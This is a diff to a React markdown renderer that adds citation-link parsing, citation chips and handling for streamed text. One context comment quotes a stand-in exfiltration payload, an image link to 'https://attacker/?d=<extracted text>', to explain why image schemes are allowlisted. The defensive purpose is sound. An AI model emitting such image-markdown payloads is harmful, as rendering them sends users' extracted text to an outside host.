@@ -6,6 +6,9 @@ import { isSafeLink, schemeOf } from "../lib/safe-link";
 import type { AnchorHTMLAttributes, ImgHTMLAttributes } from "react";
 import { useStreamingReveal } from "../hooks/useStreamingReveal";
 import { remarkPageRefs, PAGE_REF_SCHEME } from "../lib/remark-page-refs";
+import { remarkCitations, parseCitationUrl, CITATION_SCHEME } from "../lib/remark-citations";
+import { hideOpenCitation } from "../lib/citations";
+import { CitationChip } from "./CitationChip";
 
 /** Handler that jumps the preview to a page when a page citation is clicked. */
 export const PageRefContext = createContext<((page: number) => void) | null>(null);
@@ -34,7 +37,9 @@ interface MarkdownProps {
 // ![x](https://attacker/?d=<extracted text>) and exfiltrate on render.
 const SAFE_IMG_SCHEMES = ["asset:", "data:"];
 
-const remarkPlugins = [remarkGfm, remarkPageRefs];
+// Citations before page references: a marker becomes a link first, and
+// `remarkPageRefs` leaves links alone.
+const remarkPlugins = [remarkGfm, remarkCitations, remarkPageRefs];
 
 /**
  * Let the page-citation scheme survive react-markdown's URL sanitizer.
@@ -54,7 +59,7 @@ const remarkPlugins = [remarkGfm, remarkPageRefs];
  * allowlist by exactly one internal scheme that never leaves the app.
  */
 const urlTransform = (url: string) =>
-  url.startsWith(PAGE_REF_SCHEME) ? url : defaultUrlTransform(url);
+  url.startsWith(PAGE_REF_SCHEME) || url.startsWith(CITATION_SCHEME) ? url : defaultUrlTransform(url);
 const markdownComponents = {
   a: SafeAnchor,
   img: SafeImg,
@@ -67,6 +72,10 @@ function SafeAnchor({
   ...rest
 }: AnchorHTMLAttributes<HTMLAnchorElement> & { node?: unknown }) {
   const target = typeof href === "string" ? href : "";
+  if (target.startsWith(CITATION_SCHEME)) {
+    const link = parseCitationUrl(target);
+    return link ? <CitationChip link={link}>{children}</CitationChip> : <>{children}</>;
+  }
   if (target.startsWith(PAGE_REF_SCHEME)) {
     const page = parseInt(target.slice(PAGE_REF_SCHEME.length), 10);
     return <PageRefLink page={page}>{children}</PageRefLink>;
@@ -181,10 +190,12 @@ const ParsedTail = memo(function ParsedTail({ text }: { text: string }) {
 
 function MarkdownInner({ children, live = false }: MarkdownProps) {
   const revealed = useStreamingReveal(children, live);
-  const { stable, tail } = useMemo(
-    () => (live ? splitStreamingMarkdown(revealed) : { stable: "", tail: revealed }),
-    [revealed, live],
-  );
+  const { stable, tail } = useMemo(() => {
+    if (!live) return { stable: "", tail: revealed };
+    const split = splitStreamingMarkdown(revealed);
+    // Half a citation marker is noise until its closing bracket arrives.
+    return { stable: split.stable, tail: hideOpenCitation(split.tail) };
+  }, [revealed, live]);
 
   if (!live) {
     return (
